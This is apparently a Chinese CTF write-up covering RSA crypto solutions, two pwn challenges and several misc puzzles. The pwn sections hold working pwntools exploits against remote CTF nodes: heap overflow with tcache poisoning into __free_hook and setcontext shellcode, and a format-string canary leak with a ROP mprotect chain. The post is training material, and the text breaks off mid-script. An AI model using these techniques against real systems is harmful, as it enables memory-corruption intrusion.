0x9eed6ec9e43e4405c0dc6f62b7ceab3f9c744d64c4262848739447924e55e2c0462d50a7b528bd4dbee136ec8725a8374078a277786e1167c08fb0bfe8fe76c94f291f56a6a478e9d9e000efd09381f228d9567132dec682413ab38483734d31c37f127dc9e172f3aab101edc2a2ba843ecf3f9f76ba7a52dc99ad63c307cb4a9183109b5b67d51c30c5e7279012c0e234c2e8c3ff182bb398e7f69c29bf1fa950d2158fb98086c5a829a6b4616f1488df7d80346805975e39d1e3e96c5dfd5e01239ec6a5a9b0391ec5b9c0b0def3f4c688ec4d54f5a96d7121d6980d80e896aec740e86567500efc21c4adc000ea19dfab5c68e5d07bef977acedfdc3d647cdf491c8aee9d96b7445d3a8df1ee3229ed23542b8e632a77e9778482908c297858e17f3964e2d82077c76036bd01db5bec483308d651f7b1e5a9c3fe2e2678331929d01e81a488b10ac5c0723e9cf586acaa2d9f061db291bb83e41f94f98a7b8ea5939ddc91c4de57a9271b71dab42d3cf8b6b0b35dbea8d6d564aba05fdbaad82846e29c37cec8b994c209be616ae167bfea11d97297ddd46a61264ae0c0fbb129bd20d12f9a6b3b7a162e1978151b2191406fbad79775a26a122724f5d5194a6362b62bd070f8e36efec0a507e5c8b92fbd69f0ba76584c260766cc6d99b3933e9d2d77f0d06bab7469dd612d79563084bfd886edb129b5f5d2eb00c3eddef hack_RSA(e,n): &#x27;&#x27;&#x27; Finds d knowing (e,n) applying the Wiener continued fraction attack &#x27;&#x27;&#x27; frac = ContinuedFractions.rational_to_contfrac(e, n) convergents = ContinuedFractions.convergents_from_contfrac(frac) for (k,d) in convergents: #check if d is actually the key if k!=0 and (e*d-1)%k == 0: phi = (e*d-1)//k s = n - phi + 1 # check if the equation x^2 - s*x + n = 0 # has integer roots discr = s*s - 4*n if(discr&gt;=0): t = Arithmetic.is_perfect_square(discr) if t!=-1 and (s+t)%2==0: print(&quot;Hacked!&quot;) return d, phidef pi_b(x): bt = 536380958350616057242691418634880594502192106332317228051967064327642091297687630174183636288378234177476435270519631690543765125295554448698898712393467267006465045949611180821007306678935181142803069337672948471202242891010188677287454504933695082327796243976863378333980923047411230913909715527759877351702062345876337256220760223926254773346698839492268265110546383782370744599490250832085044856878026833181982756791595730336514399767134613980006467147592898197961789187070786602534602178082726728869941829230655559180178594489856595304902790182697751195581218334712892008282605180395912026326384913562290014629187579128041030500771670510157597682826798117937852656884106597180126028398398087318119586692935386069677459788971114075941533740462978961436933215446347246886948166247617422293043364968298176007659058279518552847235689217185712791081965260495815179909242072310545078116020998113413517429654328367707069941427368374644442366092232916196726067387582032505389946398237261580350780769275427857010543262176468343294217258086275244086292475394366278211528621216522312552812343261375050388129743012932727654986046774759567950981007877856194574274373776538888953502272879816420369255752871177234736347325263320696917012616273 return invmod(x, bt)t = pi_b(e)phi = hack_RSA(t, n)[1]d = invmod(e, phi)res = powmod(cipher, d, n)print(n2s(int(res))) easy_pow 这道题是[羊城杯 2020]Power原题： 123456789101112131415161718192021222324from Crypto.Util.number import *from gmpy2 import lcm, invert from secret import flage = 65537p = getPrime(512)q = getPrime(512)n = p**4*qc = pow(bytes_to_long(flag), e, n)print(c)hint1 = (invert(e, lcm(p - 1, q - 1))) % (p - 1) print(hint1)b = 449703347709287328982446812318870158230369688625894307953604074502413258045265502496365998383562119915565080518077360839705004058211784369656486678307007348691991136610142919372779782779111507129101110674559235388392082113417306002050124215904803026894400155194275424834577942500150410440057660679460918645357376095613079720172148302097893734034788458122333816759162605888879531594217661921547293164281934920669935417080156833072528358511807757748554348615957977663784762124746554638152693469580761002437793837094101338408017407251986116589240523625340964025531357446706263871843489143068620501020284421781243879675292060268876353250854369189182926055204229002568224846436918153245720514450234433170717311083868591477186061896282790880850797471658321324127334704438430354844770131980049668516350774939625369909869906362174015628078258039638111064842324979997867746404806457329528690722757322373158670827203350590809390932986616805533168714686834174965211242863201076482127152571774960580915318022303418111346406295217571564155573765371519749325922145875128395909112254242027512400564855444101325427710643212690768272048881411988830011985059218048684311349415764441760364762942692722834850287985399559042457470942580456516395188637916303814055777357738894264037988945951468416861647204658893837753361851667573185920779272635885127149348845064478121843462789367112698673780005436144393573832498203659056909233757206537514290993810628872250841862059672570704733990716282248839a = 2021*p**3 + 2022 + 2023*p**4hint2 = pow(2, a, b)print(hint2)# c = 299017261835189498646801799047751320695668439348487790148528895116908291237131013926772081799359589818341682677111543442738252080655908837832980607220654285415406849188648588876074312051164587055277017087038387169198951679119726082130868577905495307509637437814639023859871022938423168215797501175602649102621121969715328259139345090638555904577654447171932081642373835789445132466483809296734563016796846181929739289611878336934959331072502575341363049247881265649823417307615491433072850482074652957723543487026059316519285366802688885941059639121330455152478436982943059233339674041805741182096012792918311275489444605460198614371459471817407804289704524901847153843161249387208624993194285848787852634062441217234375549379380562009770380599080279723135784896688900810431588688332192335709518547640569711433618297677079620698012458053569647547533141501523434448045634646828827172848593990693592901227377493322141118565281304196426176682214434838100064256923548036690051664051936039970959246550139917211615752871493362724592143267948814481824417708986007126979214014590455837766290295441889285916265364654809662082923890960381278762698116724490968196229881400330090923027715288555056444792729745833577501899130568724790858022446326695539071814537878834059655627706444192634195723979046739351624465832476575907100097011055108105860691993049169856798600475407542166158235082147463523443663009573254123280611097423735159597787799640249067078454450453894294270686260545979274# hint1 = 5721198034334676541837614694444858336798773246799126905170215130476545540224374062960340456885923620963383130312535476337226014394595162625328729352118817# hint2 = 70105679627771719775142746553136794250337998462106229956679264658530098746665466868944855488308669706231622476566195559705924155363353360283408488917464065710623926781621366649773018113928630700594350396854359790092271835687816435058239792764298042156558375596434224003013749584571959306678511753195214791439107077903813757339868710576521858061442786434257451730633431229846440096297272405246087428205202111469272496134202922842748813992627453559734564891714846769627501147879058486675487738815514505109515031476986129016953015076080656764571648130270143686579720157712521222948534007797015393032826637675765983480855079052044005355401993107282102074405371246891417816527026361635916312955134612786069557685941228464218624689513588345168398491708253400514386622804630997 首先看hint2，这是一个简单的离散对数的问题，这里我们先使用spmpy库将指数求解出来之后，再使用方程式求解： 1234567from sympy.ntheory import discrete_logb = hint2 = x = discrete_log(b, hint2, 2)print(x) 12345sage: x = sage: b = sage: R.&lt;p&gt;=Zmod(b)[]sage: f = 2021*p*p*p + 2022 + 2023*p*p*p*p - xsage: f.roots() 也可以直接求解，但是因为前面是有限域下的高次方程，直接求解的情况可能比较局限： 12345sage: b = sage: hint2 = sage: x = discrete_log(hint2, mod(2, b))sage: var(&#x27;p&#x27;)sage: solve([2021*p*p*p+2022+2023*p*p*p*p==x],p) 解得p值为（其余三个解都为分数）： 19849483964909942642702841079905240118177503474715624145847966507461420748914700088374273209071471481219849748116334914172343735036739076730486732571971497 接下来就是已知hint1，如何通过p求解了： c=m^{e}\\pmod n\\\\ c^{hint1}=m^{e*hint1}\\pmod n\\\\ \\begin{align} c^{hint1}&=m^{e*hint1}+k*n\\\\ &=m^{e*hint1}+k*p\\\\ \\end{align} 所以有： c^{hint1}=m^{e*hint1}\\pmod p 由于： e*hint1=1+k*lcm(p-1, q-1) 易知$p-1|lcm(p-1,q-1)$，所以： e*hint1=1\\pmod {p-1} 那么就构成了新的rsa公式，模为p、加密指数e、解密指数hint1、$\\varphi(n)=p-1$，前提为$m\\lt p$。 12345678import libnumimport gmpy2c = 70105679627771719775142746553136794250337998462106229956679264658530098746665466868944855488308669706231622476566195559705924155363353360283408488917464065710623926781621366649773018113928630700594350396854359790092271835687816435058239792764298042156558375596434224003013749584571959306678511753195214791439107077903813757339868710576521858061442786434257451730633431229846440096297272405246087428205202111469272496134202922842748813992627453559734564891714846769627501147879058486675487738815514505109515031476986129016953015076080656764571648130270143686579720157712521222948534007797015393032826637675765983480855079052044005355401993107282102074405371246891417816527026361635916312955134612786069557685941228464218624689513588345168398491708253400514386622804630997p = 9849483964909942642702841079905240118177503474715624145847966507461420748914700088374273209071471481219849748116334914172343735036739076730486732571971497hint1 = 5721198034334676541837614694444858336798773246799126905170215130476545540224374062960340456885923620963383130312535476337226014394595162625328729352118817m = pow(c, hint1, p)print(libnum.n2s(int(m))) 1flag&#123;24uz5n82476b3315k6m8rk333b37pa22&#125; ps：这道题前面一直做不出来，发现解出来的p位数有问题，后面去群里问了大佬才知道hint2和c的位置错了=-= pwndatasystem 参考链接：https://www.cnblogs.com/LynneHuan/p/15335597.html 使用seccomp-tool检查禁用函数，简介链接：http://pollux.cc/2019/09/22/seccomp%E6%B2%99%E7%AE%B1%E6%9C%BA%E5%88%B6%20&amp;%202019ByteCTF%20VIP/ seccomp-tool安装： 12sudo apt install gcc ruby-devsudo gem install seccomp-tools 重点关注PR_SET_NO_NEW_PRIVS(38)和PR_SET_SECCOMP(22)标志位： PR_SET_NO_NEW_PRIVS的第二个参数若设置为1，那么程序线程将不能通过执行execve系统调用来获得提权，该选项只对execve这个系统调用有效。 如果参数2为SECCOMP_MODE_STRICT(1)，则只允许调用read、write、_exit(not exit_group)、sigreturn这几个syscall。如果参数2为SECCOMP_MODE_FILTER(2)，则为过滤模式,其中对syscall的限制通过参数3的结构体，来自定义过滤规则。 关注禁用函数，首先不能提权，其次使用自定义禁用的结构体v4： 1234567891011121314151617181920212223242526unsigned __int64 sub_27E0()&#123; __int16 v1; // [rsp+0h] [rbp-48h] BYREF __int64 *v2; // [rsp+8h] [rbp-40h] __int64 v3[5]; // [rsp+10h] [rbp-38h] BYREF unsigned __int64 v4; // [rsp+38h] [rbp-10h] v4 = __readfsqword(0x28u); setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); if ( (unsigned int)mmap((void *)0x23330000, 0x1000uLL, 7, 34, -1, 0LL) != 590544896 ) exit(-1); memset((void *)0x23330000, 0, 0x1000uLL); v3[1] = 0x3B01020015LL; v3[0] = 32LL; v3[2] = 0xB00010015LL; v3[4] = 6LL; v3[3] = 0x7FFF000000000006LL; v1 = 5; v2 = v3; prctl(38, 1LL, 0LL, 0LL, 0LL); prctl(22, 2LL, &amp;v1); memset(&amp;unk_50A0, 0x61u, 0x500uLL); return __readfsqword(0x28u) ^ v4;&#125; 禁止使用execve函数和mprotect函数： 12345678-&gt; % seccomp-tools dump ./datasystem line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000000 A = sys_number 0001: 0x15 0x02 0x01 0x0000003b if (A == execve) goto 0004 else goto 0003 0002: 0x15 0x01 0x00 0x0000000b if (A == 11) goto 0004 0003: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0004: 0x06 0x00 0x00 0x00000000 return KILL 并且存在一个出题人留给我们的rwx区域，这样我们就可以不用使用mprotect函数修改区域属性了： 看一下mmap函数： 1mmap(void *start, size_t length, int prot, int flags, int fd, off_t offsize); 用来将某个文件内容映射到内存中，对该内存区域的存取即是直接对该文件内容的读写。 返回值：若映射成功则返回映射区的内存起始地址，否则返回MAP_FAILED(-1)，错误原因存于errno中。 发现check函数，截取首尾两部分： 123456789101112131415161718192021222324252627__int64 sub_2170()&#123; v67 = __readfsqword(0x28u); *(__m128i *)s2 = _mm_load_si128((const __m128i *)&amp;xmmword_3100); v66 = 0; p_src = &amp;src; si128 = _mm_load_si128((const __m128i *)&amp;xmmword_3110); __printf_chk(1LL, &quot;please input username: &quot;); read(0, buf, 0x20uLL); __printf_chk(1LL, &quot;please input password: &quot;); v1 = read(0, &amp;src, 0x20uLL); v2 = _mm_load_si128((const __m128i *)&amp;xmmword_30E0);...LABEL_18: s1 = v52; v59 = v53; v60 = v54; if ( strcmp(buf, &quot;admin&quot;) || (v21 = strcmp((const char *)&amp;s1, s2), v22 = 1, v21) ) &#123; puts(&quot;Login Fail&quot;); return 0; &#125; return v22;&#125; 中间的加密过程过于复杂，但是可以看到最后进行了用户名和密码的判断。且由于没有调用memset函数，导致可能存在脏数据，而且调用的是read函数，不会在读入字符的最后加上截断，所以这里我们需要输入admin\\x00。 由于这里strcmp((const char *)&amp;s1, s2)语句中，存在栈内参数s2，使用gdb进行调试比较麻烦，所以我们这里选择使用IDA进行远程调试： 选择Remote Linux debugger，并选择Debugger -&gt; Process options修改远程调试配置： 在关键判断处下断点并运行，输入admin/空，显示s2为如下： 我们直接赋值这串0ea1fb4edf4aae8fb2ee19fb2ee19cfbe362为密码，再次进行调试，发现字符串s2的头位为\\0，那么我们是否只要伪造s1的字符串头位为\\0，就可以绕过检测。 这里进行爆破，写脚本： 123456789101112from pwn import *context.log_level = &quot;error&quot;for char in range(0x100): sh = process(&#x27;./datasystem&#x27;) sh.sendafter(&quot;please input username: &quot;, &quot;admin\\x00&quot;) sh.sendafter(&quot;please input password: &quot;, chr(char) * 32) msg = sh.recvline() if b&quot;Login Fail&quot; not in msg: print(&quot;valid char:&quot;, chr(char)) sh.close() 12(&#x27;valid char:&#x27;, &#x27;c&#x27;)(&#x27;valid char:&#x27;, &#x27;\\xec&#x27;) 接下来就是简单的堆溢出： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566void __noreturn sub_558B0F1BBD40()&#123; const char *v0; // rdx __int64 v1; // rax int v2; // [rsp+0h] [rbp-38h] BYREF unsigned int v3; // [rsp+4h] [rbp-34h] BYREF unsigned __int64 v4; // [rsp+8h] [rbp-30h] v4 = __readfsqword(0x28u); while ( 1 ) &#123; while ( 1 ) &#123; while ( 1 ) &#123; puts(&quot;1.add&quot;); puts(&quot;2.delete&quot;); puts(&quot;3.show&quot;); puts(&quot;4.edit&quot;); puts(&quot;5.exit&quot;); puts(&quot;&gt;&gt; :&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v2); if ( v2 != 1 ) break; sub_558B0F1BB970(); // 新增堆 &#125; if ( v2 == 2 ) break; if ( v2 == 3 ) // 打印堆 &#123; puts(&quot;Index:&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v3); // 输入堆序号 v0 = (const char *)qword_558B0F1BE5A0[v3]; // 如果指针存在 if ( v0 ) __printf_chk(1LL, &quot;Content: %s&quot;, v0); // 打印堆内容 &#125; else &#123; if ( v2 != 4 ) // 修改堆 exit(-1); puts(&quot;Index:&quot;); __isoc99_scanf(&quot;%d&quot;, &amp;v3); // 输入堆序号 if ( qword_558B0F1BE5A0[v3] ) // 如果指针存在 &#123; puts(&quot;Content:&quot;); read(0, (void *)qword_558B0F1BE5A0[v3], dword_558B0F1BE600[v3]); // 读入长度dword_558B0F1BE600[v3] &#125; else &#123; puts(&quot;wrong&quot;); &#125; &#125; &#125; puts(&quot;Index:&quot;); // 删除堆 __isoc99_scanf(&quot;%d&quot;, &amp;v3); if ( v3 &gt; 0xB ) &#123; puts(&quot;wrong&quot;); exit(0); &#125; free((void *)qword_558B0F1BE5A0[v3]); // 这里没有检测堆是否存在，可能存在double free漏洞 v1 = v3; qword_558B0F1BE5A0[v3] = 0LL; // 对指针和数组长度清零 dword_558B0F1BE600[v1] = 0; &#125;&#125; 新增堆（这个检测堆是否存在的逻辑还真的是清奇）： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495unsigned __int64 sub_558B0F1BB970()&#123; __int64 v0; // rbx size_t v1; // rdi int v2; // ebp unsigned int v3; // ebp ssize_t v4; // rax _DWORD maxlen[9]; // [rsp+4h] [rbp-24h] BYREF *(_QWORD *)&amp;maxlen[1] = __readfsqword(0x28u); if ( qword_558B0F1BE5A0[0] ) // 检测有哪个堆空出来了 &#123; if ( qword_558B0F1BE5A8 ) &#123; if ( qword_558B0F1BE5B0 ) &#123; if ( qword_558B0F1BE5B8 ) &#123; if ( qword_558B0F1BE5C0 ) &#123; if ( qword_558B0F1BE5C8 ) &#123; if ( qword_558B0F1BE5D0 ) &#123; if ( qword_558B0F1BE5D8 ) &#123; if ( qword_558B0F1BE5E0 ) &#123; v0 = 0LL; if ( !qword_558B0F1BE5E8 ) v0 = 9LL; &#125; else &#123; v0 = 8LL; &#125; &#125; else &#123; v0 = 7LL; &#125; &#125; else &#123; v0 = 6LL; &#125; &#125; else &#123; v0 = 5LL; &#125; &#125; else &#123; v0 = 4LL; &#125; &#125; else &#123; v0 = 3LL; &#125; &#125; else &#123; v0 = 2LL; &#125; &#125; else &#123; v0 = 1LL; &#125; &#125; else &#123; v0 = 0LL; &#125; puts(&quot;Size: &quot;); // 输入新增大小 __isoc99_scanf(&quot;%d&quot;, maxlen); v1 = maxlen[0]; v2 = maxlen[0]; if ( maxlen[0] &gt; 0x500u ) &#123; maxlen[0] = 1280; // 如果大于0x500，赋值v2，v1变量为0x500 v2 = 1280; v1 = 1280LL; &#125; qword_558B0F1BE5A0[v0] = (__int64)malloc(v1); // 新增堆时没有对内容清零i dword_558B0F1BE600[v0] = v2; puts(&quot;fuiling with my data&quot;); v3 = snprintf((char *)qword_558B0F1BE5A0[v0], maxlen[0], &quot;%s&quot;, byte_558B0F1BE0A0); puts(&quot;what&#x27;s your Content: &quot;); v4 = read(0, (void *)qword_558B0F1BE5A0[v0], v3); // 但是这里读入的时候使用的是v3 if ( maxlen[0] &lt; v4 ) puts(&quot;Error,try again&quot;); return __readfsqword(0x28u) ^ *(_QWORD *)&amp;maxlen[1]; 这里回顾一下snprintf函数： 1int snprintf(char* dest_str,size_t size,const char* format,...); 如果格式化后的字符串长度小于等于size，则会把字符串全部复制到str中，并给其后添加一个字符串结束符\\0。 如果格式化后的字符串长度大于size，超过size的部分会被截断，只将其中的 size-1个字符复制到str中，并给其后添加一个字符串结束符\\0，返回值为欲写入的字符串长度。 所以这里v3为作者想要写入的数据长度，就看byte_558B0F1BE0A0的\\0在哪个位置： 12puts(&quot;fuiling with my data&quot;);v3 = snprintf((char *)qword_558B0F1BE5A0[v0], maxlen[0], &quot;%s&quot;, byte_558B0F1BE0A0); 这里使用gdb调试： 12345678910111213141516171819from pwn import *context.log_level = &quot;debug&quot;sh = process(&#x27;./datasystem&#x27;)def login(): sh.sendafter(&#x27;please input username: &#x27;, &#x27;admin\\x00&#x27;) sh.sendafter(&#x27;please input password: &#x27;, &#x27;c&#x27; * 0x20) def add(size, content): sh.sendlineafter(&#x27;&gt;&gt; :&#x27;, &#x27;1&#x27;) sh.sendlineafter(&#x27;Size:&#x27;, str(size)) sh.sendafter(&#x27;Content:&#x27;, content)login()pause()add(0x20, &#x27;a&#x27; * 0x20)sh.interactive() 读入时，变成了0x506字节长度，那么存在堆溢出（虽然最后会判断并回显失败，但实际上已经写入）： 注意gdb调试的是由于开启了aslr，所以使用b *addr或者b *$rebase(addr)会定位不到地址，因为text地址还有一段随机偏移，所以需要使用命令sudo sh -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;。 现在分析0x506是如何形成的： 发现byte_558B0F1BE0A0数组被初始化为0x500个a字符。 且在数组后面存有一个6位的地址，其实这里存放着第一个堆空间的指针： 由于堆地址为6位，高位为\\x00所以会直接截断。 这里复习一下main_arena的结构： 1234567891011121314151617181920212223242526struct malloc_state&#123;__libc_lock_define (, mutex); // 锁int flags;int have_fastchunks; // 如果fastbin不为空，这个字段就被置位/* Fastbins */mfastbinptr fastbinsY[NFASTBINS];mchunkptr top; // 指向top chunkmchunkptr last_remainder; // 指向切割后剩下的last reminder/* Normal bins packed as described above */mchunkptr bins[NBINS * 2 - 2];unsigned int binmap[BINMAPSIZE]; // bin的位图struct malloc_state *next;struct malloc_state *next_free;INTERNAL_SIZE_T attached_threads; // 引用当前arena的线程数量INTERNAL_SIZE_T system_mem; // 记录当前一个获取的系统内存INTERNAL_SIZE_T max_system_mem;&#125;; 1234567891011pwndbg&gt; x/20gx 0x7ffff7dd1b100x7ffff7dd1b10 &lt;__malloc_hook&gt;: 0x0000000000000000 0x00000000000000000x7ffff7dd1b20 &lt;main_arena&gt;: 0x0000000100000000 0x0000000000000000 mutex flag, fastbin 0x200x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000 0x0000000000000000 0x30, 0x400x7ffff7dd1b40 &lt;main_arena+32&gt;: 0x0000000000000000 0x0000000000000000 0x50, 0x600x7ffff7dd1b50 &lt;main_arena+48&gt;: 0x0000000000000000 0x0000000000000000 0x70, 0x800x7ffff7dd1b60 &lt;main_arena+64&gt;: 0x0000000000000000 0x0000000000000000 0x7ffff7dd1b70 &lt;main_arena+80&gt;: 0x0000000000000000 0x000055555555a0c0 , topchunk0x7ffff7dd1b80 &lt;main_arena+96&gt;: 0x000055555555a020 0x000055555555a020 last_remiander, unsorted bin0x7ffff7dd1b90 &lt;main_arena+112&gt;: 0x000055555555a020 0x00007ffff7dd1b88 , small bin0x7ffff7dd1ba0 &lt;main_arena+128&gt;: 0x00007ffff7dd1b88 0x00007ffff7dd1b98 知道存在堆溢出后，思路具体如下： 首先构造一个unsorted bin。 使用unsorted bin残存的bk，泄露出libc地址。 利用tcache posion attack将堆分配到__free_hook - 0x200的位置。 将__free_hook修改为setcontext + 53，修改寄存器环境，执行read函数。 利用程序mmap的0x23330000这一段rwx内存执行shellcode。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566from pwn import *context(log_level = &quot;debug&quot;, arch = &#x27;amd64&#x27;, endian = &#x27;little&#x27;)# sh = process(&#x27;./datasystem&#x27;)sh = remote(&#x27;node4.buuoj.cn&#x27;, 27560)elf = ELF(&#x27;./datasystem&#x27;)libc = elf.libcdef login(): sh.sendafter(&#x27;please input username: &#x27;, &#x27;admin\\x00&#x27;) sh.sendafter(&#x27;please input password: &#x27;, &#x27;c&#x27; * 0x20) def add(size, content): sh.sendlineafter(&#x27;&gt;&gt; :&#x27;, &#x27;1&#x27;) sh.sendlineafter(&#x27;Size:&#x27;, str(size)) sh.sendafter(&#x27;Content:&#x27;, content)def edit(idx, content): sh.sendlineafter(&#x27;&gt;&gt; :&#x27;, &#x27;4&#x27;) sh.sendafter(&#x27;Index:&#x27;, str(idx)) sh.sendafter(&#x27;Content:&#x27;, content)def show(idx): sh.sendlineafter(&#x27;&gt;&gt; :&#x27;, &#x27;3&#x27;) sh.sendlineafter(&#x27;Index:&#x27;, str(idx))def free(idx): sh.sendlineafter(&#x27;&gt;&gt; :&#x27;, &#x27;2&#x27;) sh.sendlineafter(&#x27;Index:&#x27;, str(idx))login()add(0x440, &#x27;a&#x27;)add(0x10, &#x27;a&#x27;)free(0)add(0x8, &#x27;a&#x27; * 0x8)show(0)sh.recvuntil(&#x27;a&#x27; * 0x8)leak_addr = u64(sh.recvuntil(&#x27;\\x7f&#x27;).ljust(8, &#x27;\\x00&#x27;))print(hex(libc.sym[&#x27;__malloc_hook&#x27;]))print(hex(leak_addr))libc_base = leak_addr - 0x58 - 0x10 - 0x3f8 - 0x10 - libc.sym[&#x27;__malloc_hook&#x27;]print(hex(libc_base))libc.address = libc_baseadd(0x20, &#x27;\\n&#x27;)free(2)free(0)add(0x10, flat([0, 0, 0, 0x31, libc.sym[&#x27;__free_hook&#x27;] - 0x200]))add(0x20, &#x27;\\n&#x27;)# read(0, 0x23330000, 0x200) # rdi = 0, rsi = 0x23330000, rdx = 0x200payload = flat([p64(0) * 0xd, p64(0), p64(0x23330000), p64(0) * 2, # 0x68 rdi 0x70 rsip64(0x200) + p64(0) * 2, # 0x88 rdxp64(libc.sym[&#x27;__free_hook&#x27;] - 0x100), p64(libc.sym[&#x27;read&#x27;]), # 0xa0 rsp, 0xa8 rcxp64(0) * 0xa, p64(0x23330000), # 0x100 rsp2p64(0) * 0x1f, p64(libc.sym[&#x27;setcontext&#x27;] + 53)]) # 0x200 __free_hookadd(0x20, payload)pause()free(3)sh.sendline(asm(shellcraft.cat(&quot;/flag&quot;)))sh.interactive() 最终获得flag： 1flag&#123;5ec939f8-6ffb-43b9-b4ce-cfc5258f2c33&#125; hehepwn 一道简单的栈溢出题，是安恒平台上的原题。这里就不做了。补充一个读flag的shellcode姿势： 1asm(shellcraft.cat(&#x27;/flag&#x27;)) hahapwn 常规检查： 1234567-&gt; % checksec pwn[*] &#x27;/home/secc/Desktop/pwn&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) 关注禁用函数，首先不能提权，其次使用自定义禁用的结构体v4： 12345678910111213int __cdecl main(int argc, const char **argv, const char **envp)&#123; __int16 v4; // [rsp+0h] [rbp-40h] BYREF unsigned __int64 v22; // [rsp+38h] [rbp-8h] v22 = __readfsqword(0x28u); setvbuf(_bss_start, 0LL, 2, 0LL); setvbuf(stdin, 0LL, 2, 0LL); prctl(38, 1LL, 0LL, 0LL, 0LL); prctl(22, 2LL, &amp;v4); welcome(); return 0;&#125; 不允许使用execve系统调用： 1234567-&gt; % seccomp-tools dump ./pwn line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000000 A = sys_number 0001: 0x15 0x00 0x01 0x0000003b if (A != execve) goto 0003 0002: 0x06 0x00 0x00 0x00000000 return KILL 0003: 0x06 0x00 0x00 0x7fff0000 return ALLOW 打开IDA反编译程序，主函数很简单： 123456789101112131415unsigned __int64 welcome()&#123; char buf[64]; // [rsp+0h] [rbp-B0h] BYREF char v2[104]; // [rsp+40h] [rbp-70h] BYREF unsigned __int64 v3; // [rsp+A8h] [rbp-8h] v3 = __readfsqword(0x28u); puts(&quot;Welcome! What is your name?&quot;); read(0, buf, 0x40uLL); puts(&quot;Hello &quot;); printf(buf); // 存在格式化字符串漏洞 puts(&quot;\\nWhat can we help you?&quot;); read(0, v2, 0x200uLL); // 存在栈溢出漏洞 return __readfsqword(0x28u) ^ v3;&#125; 具体思路是，使用格式化字符串泄露canary、stack、libc地址。 首先用gdb调试，找到canary、stack、libc分别为25、27和28位（25 = 0x14 + 0x5），使用格式化字符串%25$p$27$p%28$p泄露地址。 主要思路： 泄露地址。 栈溢出将shellcode写入到bss段。 使用mprotect系统调用修改bss段为rwx权限，返回到bss段getshell。 形成脚本： 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *context(log_level = &#x27;debug&#x27;, arch = &#x27;amd64&#x27;, endian = &#x27;little&#x27;)# sh = process(&#x27;./pwn&#x27;)sh = remote(&#x27;node4.buuoj.cn&#x27;, 26504)elf = ELF(&#x27;./pwn&#x27;)libc = elf.libcpause()sh.sendafter(&#x27;Welcome! What is your name?\\n&#x27;, &#x27;%25$p%27$p%28$p&#x27;)sh.recvuntil(&#x27;0x&#x27;)leak_info = sh.recvline()libc_base = int(leak_info[:12], 16) - libc.sym[&#x27;setvbuf&#x27;] - 324canary = int(leak_info[14:30], 16)stack = int(leak_info[32:44], 16)print(hex(libc_base), hex(canary), hex(stack))bss_addr = 0x0601060rsi_ret = libc_base + next(libc.search(asm(&quot;pop rsi\\nret&quot;)))rdx_ret = libc_base + next(libc.search(asm(&quot;pop rdx\\nret&quot;)))rdi_ret = libc_base + next(libc.search(asm(&quot;pop rdi\\nret&quot;)))rax_ret = libc_base + next(libc.search(asm(&quot;pop rax\\nret&quot;)))syscall = libc_base + next(libc.search(asm(&quot;syscall\\nret&quot;)))payload = flat([&#x27;a&#x27; * 0x68,canary,0,rdi_ret, 0,rsi_ret, bss_addr,rdx_ret, 800,libc_base + libc.sym[&#x27;read&#x27;],rdi_ret, bss_addr &amp; ~0xfff,rsi_ret, 0x1000,rdx_ret, 7,rax_ret, 0xa,syscall,bss_addr])sh.sendlineafter(&#x27;What can we help you?\\n&#x27;, payload)sh.send(asm(shellcraft.cat(&#x27;./flag&#x27;)))sh.interactive() 注意使用SYS_mprotect系统调用时，输入的地址需要是合法且是目录页（page size）的倍数，64位系统的目录页为0x1000，所以这里采用了bss_addr &amp; ~0xfff的形式。 miscGirlfriend’s account 打开题目发现是一个计算题： 1flag&#123;账单总金额四舍五入保留至小数点后两位&#125;，例如总金额为 543.21 元时，你需要提交 flag&#123;543.21&#125; 使用excel的公式转换大写数字： 1=SUM(ISNUMBER(SEARCH(TEXT(&#123;1,2,3,4,5,6,7,8,9&#125;,&quot;[dbnum2]&quot;&amp;&#123;&quot;0亿&quot;;&quot;0仟!*万&quot;;&quot;0佰!*万&quot;;&quot;0拾!*万&quot;;&quot;0万&quot;;&quot;万!*0仟&quot;;&quot;万!*0佰&quot;;&quot;万!*0拾&quot;;&quot;0元&quot;;&quot;0角&quot;;&quot;0分&quot;&#125;),IF(ISERR(FIND(&quot;万&quot;,A2)),&quot;万&quot;,)&amp;A2))*&#123;1,2,3,4,5,6,7,8,9&#125;*10^&#123;8;7;6;5;4;3;2;1;0;-1;-2&#125;) 1=SUM(ISNUMBER(SEARCH(TEXT(&#123;1,2,3,4,5,6,7,8,9&#125;,&quot;[dbnum2]&quot;),IF(ISERR(FIND(&quot;万&quot;,B4985)),&quot;万&quot;,)&amp;B2))*&#123;1,2,3,4,5,6,7,8,9&#125;) 注意如果要使用公式的话，需要把excel改成中文，不然会全部显示0，而且最新版的office365似乎不识别!*语法，我们： 最后计算总和即可： flag： 1flag&#123;12305926.36&#125; 双目失明，身残志坚 题目给了两张相同的图片，猜测是盲水印： 1python3 bwmforpy3.py decode original.png blind.png res.png 发现是黑白圈： 首先尝试转换成二进制，但是无法解密： 123010011111100101100100100101100111101010111111001001100010000100011 后来发现可能是盲文： 1⠌⠢⠛⠭⠛⠲⠑⠙⠔⠓⠾ 找到盲文对照表查看，应该是拼音盲文：https://blog.csdn.net/weixin_30785593/article/details/96365878 进行解密是： 1zh e g iang g ong ie d a h,x ue 所以最后flag是”浙江工业大学”拼音： 1flag&#123;zhejianggongyedaxue&#125; ZipBomb 打开题目是个压缩包，解压之后是大量的压缩包。应该是压缩包文件中隐写了flag。那么就需要进行爆破求解，flag的base64对应值是Zmxh。 由于压缩包只有两层，首先解压该压缩包到zipBomb文件夹，使用脚本爆破： 12345678910111213141516import os.pathimport zipfiledir_path = &#x27;./zipBomb&#x27;fileList = sorted(os.listdir(dir_path))[::-1]for file in fileList: position = dir_path + 